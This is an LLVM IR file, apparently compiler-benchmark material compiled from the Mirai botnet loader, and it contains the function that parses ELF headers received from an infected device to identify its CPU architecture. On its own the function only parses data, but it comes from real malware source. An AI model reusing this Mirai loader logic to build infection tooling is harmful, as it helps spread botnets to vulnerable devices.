; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/loader/src/extr_connection.c_connection_consume_arch.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/loader/src/extr_connection.c_connection_consume_arch.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.connection = type { i32, i64, %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i64*, i64 }
%struct.elf_hdr = type { i32*, i64 }

@.str = private unnamed_addr constant [4 x i8] c"ELF\00", align 1
@TRUE = common dso_local global i64 0, align 8
@EI_DATA = common dso_local global i64 0, align 8
@EM_ARM = common dso_local global i64 0, align 8
@EM_AARCH64 = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@EM_MIPS = common dso_local global i64 0, align 8
@EM_MIPS_RS3_LE = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [5 x i8] c"mpsl\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@EM_386 = common dso_local global i64 0, align 8
@EM_486 = common dso_local global i64 0, align 8
@EM_860 = common dso_local global i64 0, align 8
@EM_X86_64 = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@EM_SPARC = common dso_local global i64 0, align 8
@EM_SPARC32PLUS = common dso_local global i64 0, align 8
@EM_SPARCV9 = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [4 x i8] c"spc\00", align 1
@EM_68K = common dso_local global i64 0, align 8
@EM_88K = common dso_local global i64 0, align 8
@.str.6 = private unnamed_addr constant [5 x i8] c"m68k\00", align 1
@EM_PPC = common dso_local global i64 0, align 8
@EM_PPC64 = common dso_local global i64 0, align 8
@.str.7 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@EM_SH = common dso_local global i64 0, align 8
@.str.8 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@TOKEN_RESPONSE = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @connection_consume_arch(%struct.connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca %struct.elf_hdr*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %7 = load %struct.connection*, %struct.connection** %3, align 8
  %8 = getelementptr inbounds %struct.connection, %struct.connection* %7, i32 0, i32 2
  %9 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %8, i32 0, i32 1
  %10 = load i64, i64* %9, align 8
  %11 = icmp ne i64 %10, 0
  br i1 %11, label %213, label %12

12:                                               ; preds = %1
  %13 = load %struct.connection*, %struct.connection** %3, align 8
  %14 = getelementptr inbounds %struct.connection, %struct.connection* %13, i32 0, i32 1
  %15 = load i64, i64* %14, align 8
  %16 = load %struct.connection*, %struct.connection** %3, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 0
  %18 = load i32, i32* %17, align 8
  %19 = call i32 @util_memsearch(i64 %15, i32 %18, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i32 3)
  store i32 %19, i32* %5, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %22

21:                                               ; preds = %12
  store i32 0, i32* %2, align 4
  br label %251

22:                                               ; preds = %12
  %23 = load i32, i32* %5, align 4
  %24 = sub nsw i32 %23, 4
  store i32 %24, i32* %5, align 4
  %25 = load %struct.connection*, %struct.connection** %3, align 8
  %26 = getelementptr inbounds %struct.connection, %struct.connection* %25, i32 0, i32 1
  %27 = load i64, i64* %26, align 8
  %28 = load i32, i32* %5, align 4
  %29 = sext i32 %28 to i64
  %30 = add nsw i64 %27, %29
  %31 = inttoptr i64 %30 to %struct.elf_hdr*
  store %struct.elf_hdr* %31, %struct.elf_hdr** %4, align 8
  %32 = load i64, i64* @TRUE, align 8
  %33 = load %struct.connection*, %struct.connection** %3, align 8
  %34 = getelementptr inbounds %struct.connection, %struct.connection* %33, i32 0, i32 2
  %35 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %34, i32 0, i32 1
  store i64 %32, i64* %35, align 8
  %36 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %37 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %36, i32 0, i32 0
  %38 = load i32*, i32** %37, align 8
  %39 = load i64, i64* @EI_DATA, align 8
  %40 = getelementptr inbounds i32, i32* %38, i64 %39
  %41 = load i32, i32* %40, align 4
  switch i32 %41, label %45 [
    i32 128, label %42
    i32 130, label %43
    i32 129, label %44
  ]

42:                                               ; preds = %22
  store i32 0, i32* %2, align 4
  br label %251

43:                                               ; preds = %22
  br label %45

44:                                               ; preds = %22
  br label %45

45:                                               ; preds = %22, %44, %43
  %46 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %47 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %46, i32 0, i32 1
  %48 = load i64, i64* %47, align 8
  %49 = load i64, i64* @EM_ARM, align 8
  %50 = icmp eq i64 %48, %49
  br i1 %50, label %57, label %51

51:                                               ; preds = %45
  %52 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %53 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %52, i32 0, i32 1
  %54 = load i64, i64* %53, align 8
  %55 = load i64, i64* @EM_AARCH64, align 8
  %56 = icmp eq i64 %54, %55
  br i1 %56, label %57, label %63

57:                                               ; preds = %51, %45
  %58 = load %struct.connection*, %struct.connection** %3, align 8
  %59 = getelementptr inbounds %struct.connection, %struct.connection* %58, i32 0, i32 2
  %60 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %59, i32 0, i32 0
  %61 = load i64*, i64** %60, align 8
  %62 = call i32 @strcpy(i64* %61, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i64 0, i64 0))
  br label %212

63:                                               ; preds = %51
  %64 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %65 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %64, i32 0, i32 1
  %66 = load i64, i64* %65, align 8
  %67 = load i64, i64* @EM_MIPS, align 8
  %68 = icmp eq i64 %66, %67
  br i1 %68, label %75, label %69

69:                                               ; preds = %63
  %70 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %71 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %70, i32 0, i32 1
  %72 = load i64, i64* %71, align 8
  %73 = load i64, i64* @EM_MIPS_RS3_LE, align 8
  %74 = icmp eq i64 %72, %73
  br i1 %74, label %75, label %96

75:                                               ; preds = %69, %63
  %76 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %77 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %76, i32 0, i32 0
  %78 = load i32*, i32** %77, align 8
  %79 = load i64, i64* @EI_DATA, align 8
  %80 = getelementptr inbounds i32, i32* %78, i64 %79
  %81 = load i32, i32* %80, align 4
  %82 = icmp eq i32 %81, 129
  br i1 %82, label %83, label %89

83:                                               ; preds = %75
  %84 = load %struct.connection*, %struct.connection** %3, align 8
  %85 = getelementptr inbounds %struct.connection, %struct.connection* %84, i32 0, i32 2
  %86 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %85, i32 0, i32 0
  %87 = load i64*, i64** %86, align 8
  %88 = call i32 @strcpy(i64* %87, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0))
  br label %95

89:                                               ; preds = %75
  %90 = load %struct.connection*, %struct.connection** %3, align 8
  %91 = getelementptr inbounds %struct.connection, %struct.connection* %90, i32 0, i32 2
  %92 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %91, i32 0, i32 0
  %93 = load i64*, i64** %92, align 8
  %94 = call i32 @strcpy(i64* %93, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  br label %95

95:                                               ; preds = %89, %83
  br label %211

96:                                               ; preds = %69
  %97 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %98 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %97, i32 0, i32 1
  %99 = load i64, i64* %98, align 8
  %100 = load i64, i64* @EM_386, align 8
  %101 = icmp eq i64 %99, %100
  br i1 %101, label %120, label %102

102:                                              ; preds = %96
  %103 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %104 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %103, i32 0, i32 1
  %105 = load i64, i64* %104, align 8
  %106 = load i64, i64* @EM_486, align 8
  %107 = icmp eq i64 %105, %106
  br i1 %107, label %120, label %108

108:                                              ; preds = %102
  %109 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %110 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %109, i32 0, i32 1
  %111 = load i64, i64* %110, align 8
  %112 = load i64, i64* @EM_860, align 8
  %113 = icmp eq i64 %111, %112
  br i1 %113, label %120, label %114

114:                                              ; preds = %108
  %115 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %116 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %115, i32 0, i32 1
  %117 = load i64, i64* %116, align 8
  %118 = load i64, i64* @EM_X86_64, align 8
  %119 = icmp eq i64 %117, %118
  br i1 %119, label %120, label %126

120:                                              ; preds = %114, %108, %102, %96
  %121 = load %struct.connection*, %struct.connection** %3, align 8
  %122 = getelementptr inbounds %struct.connection, %struct.connection* %121, i32 0, i32 2
  %123 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %122, i32 0, i32 0
  %124 = load i64*, i64** %123, align 8
  %125 = call i32 @strcpy(i64* %124, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0))
  br label %210

126:                                              ; preds = %114
  %127 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %128 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %127, i32 0, i32 1
  %129 = load i64, i64* %128, align 8
  %130 = load i64, i64* @EM_SPARC, align 8
  %131 = icmp eq i64 %129, %130
  br i1 %131, label %144, label %132

132:                                              ; preds = %126
  %133 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %134 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %133, i32 0, i32 1
  %135 = load i64, i64* %134, align 8
  %136 = load i64, i64* @EM_SPARC32PLUS, align 8
  %137 = icmp eq i64 %135, %136
  br i1 %137, label %144, label %138

138:                                              ; preds = %132
  %139 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %140 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %139, i32 0, i32 1
  %141 = load i64, i64* %140, align 8
  %142 = load i64, i64* @EM_SPARCV9, align 8
  %143 = icmp eq i64 %141, %142
  br i1 %143, label %144, label %150

144:                                              ; preds = %138, %132, %126
  %145 = load %struct.connection*, %struct.connection** %3, align 8
  %146 = getelementptr inbounds %struct.connection, %struct.connection* %145, i32 0, i32 2
  %147 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %146, i32 0, i32 0
  %148 = load i64*, i64** %147, align 8
  %149 = call i32 @strcpy(i64* %148, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i64 0, i64 0))
  br label %209

150:                                              ; preds = %138
  %151 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %152 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %151, i32 0, i32 1
  %153 = load i64, i64* %152, align 8
  %154 = load i64, i64* @EM_68K, align 8
  %155 = icmp eq i64 %153, %154
  br i1 %155, label %162, label %156

156:                                              ; preds = %150
  %157 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %158 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %157, i32 0, i32 1
  %159 = load i64, i64* %158, align 8
  %160 = load i64, i64* @EM_88K, align 8
  %161 = icmp eq i64 %159, %160
  br i1 %161, label %162, label %168

162:                                              ; preds = %156, %150
  %163 = load %struct.connection*, %struct.connection** %3, align 8
  %164 = getelementptr inbounds %struct.connection, %struct.connection* %163, i32 0, i32 2
  %165 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %164, i32 0, i32 0
  %166 = load i64*, i64** %165, align 8
  %167 = call i32 @strcpy(i64* %166, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0))
  br label %208

168:                                              ; preds = %156
  %169 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %170 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %169, i32 0, i32 1
  %171 = load i64, i64* %170, align 8
  %172 = load i64, i64* @EM_PPC, align 8
  %173 = icmp eq i64 %171, %172
  br i1 %173, label %180, label %174

174:                                              ; preds = %168
  %175 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %176 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %175, i32 0, i32 1
  %177 = load i64, i64* %176, align 8
  %178 = load i64, i64* @EM_PPC64, align 8
  %179 = icmp eq i64 %177, %178
  br i1 %179, label %180, label %186

180:                                              ; preds = %174, %168
  %181 = load %struct.connection*, %struct.connection** %3, align 8
  %182 = getelementptr inbounds %struct.connection, %struct.connection* %181, i32 0, i32 2
  %183 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %182, i32 0, i32 0
  %184 = load i64*, i64** %183, align 8
  %185 = call i32 @strcpy(i64* %184, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0))
  br label %207

186:                                              ; preds = %174
  %187 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %188 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %187, i32 0, i32 1
  %189 = load i64, i64* %188, align 8
  %190 = load i64, i64* @EM_SH, align 8
  %191 = icmp eq i64 %189, %190
  br i1 %191, label %192, label %198

192:                                              ; preds = %186
  %193 = load %struct.connection*, %struct.connection** %3, align 8
  %194 = getelementptr inbounds %struct.connection, %struct.connection* %193, i32 0, i32 2
  %195 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %194, i32 0, i32 0
  %196 = load i64*, i64** %195, align 8
  %197 = call i32 @strcpy(i64* %196, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i64 0, i64 0))
  br label %206

198:                                              ; preds = %186
  %199 = load %struct.connection*, %struct.connection** %3, align 8
  %200 = getelementptr inbounds %struct.connection, %struct.connection* %199, i32 0, i32 2
  %201 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %200, i32 0, i32 0
  %202 = load i64*, i64** %201, align 8
  %203 = getelementptr inbounds i64, i64* %202, i64 0
  store i64 0, i64* %203, align 8
  %204 = load %struct.connection*, %struct.connection** %3, align 8
  %205 = call i32 @connection_close(%struct.connection* %204)
  br label %206

206:                                              ; preds = %198, %192
  br label %207

207:                                              ; preds = %206, %180
  br label %208

208:                                              ; preds = %207, %162
  br label %209

209:                                              ; preds = %208, %144
  br label %210

210:                                              ; preds = %209, %120
  br label %211

211:                                              ; preds = %210, %95
  br label %212

212:                                              ; preds = %211, %57
  br label %250

213:                                              ; preds = %1
  %214 = load %struct.connection*, %struct.connection** %3, align 8
  %215 = getelementptr inbounds %struct.connection, %struct.connection* %214, i32 0, i32 1
  %216 = load i64, i64* %215, align 8
  %217 = load %struct.connection*, %struct.connection** %3, align 8
  %218 = getelementptr inbounds %struct.connection, %struct.connection* %217, i32 0, i32 0
  %219 = load i32, i32* %218, align 8
  %220 = load i8*, i8** @TOKEN_RESPONSE, align 8
  %221 = load i8*, i8** @TOKEN_RESPONSE, align 8
  %222 = call i32 @strlen(i8* %221)
  %223 = call i32 @util_memsearch(i64 %216, i32 %219, i8* %220, i32 %222)
  store i32 %223, i32* %6, align 4
  %224 = icmp ne i32 %223, -1
  br i1 %224, label %225, label %227

225:                                              ; preds = %213
  %226 = load i32, i32* %6, align 4
  store i32 %226, i32* %2, align 4
  br label %251

227:                                              ; preds = %213
  %228 = load %struct.connection*, %struct.connection** %3, align 8
  %229 = getelementptr inbounds %struct.connection, %struct.connection* %228, i32 0, i32 0
  %230 = load i32, i32* %229, align 8
  %231 = icmp sgt i32 %230, 7168
  br i1 %231, label %232, label %249

232:                                              ; preds = %227
  %233 = load %struct.connection*, %struct.connection** %3, align 8
  %234 = getelementptr inbounds %struct.connection, %struct.connection* %233, i32 0, i32 1
  %235 = load i64, i64* %234, align 8
  %236 = load %struct.connection*, %struct.connection** %3, align 8
  %237 = getelementptr inbounds %struct.connection, %struct.connection* %236, i32 0, i32 1
  %238 = load i64, i64* %237, align 8
  %239 = add nsw i64 %238, 6144
  %240 = load %struct.connection*, %struct.connection** %3, align 8
  %241 = getelementptr inbounds %struct.connection, %struct.connection* %240, i32 0, i32 0
  %242 = load i32, i32* %241, align 8
  %243 = sub nsw i32 %242, 6144
  %244 = call i32 @memmove(i64 %235, i64 %239, i32 %243)
  %245 = load %struct.connection*, %struct.connection** %3, align 8
  %246 = getelementptr inbounds %struct.connection, %struct.connection* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = sub nsw i32 %247, 6144
  store i32 %248, i32* %246, align 8
  br label %249

249:                                              ; preds = %232, %227
  br label %250

250:                                              ; preds = %249, %212
  store i32 0, i32* %2, align 4
  br label %251

251:                                              ; preds = %250, %225, %42, %21
  %252 = load i32, i32* %2, align 4
  ret i32 %252
}

declare dso_local i32 @util_memsearch(i64, i32, i8*, i32) #1

declare dso_local i32 @strcpy(i64*, i8*) #1

declare dso_local i32 @connection_close(%struct.connection*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memmove(i64, i64, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
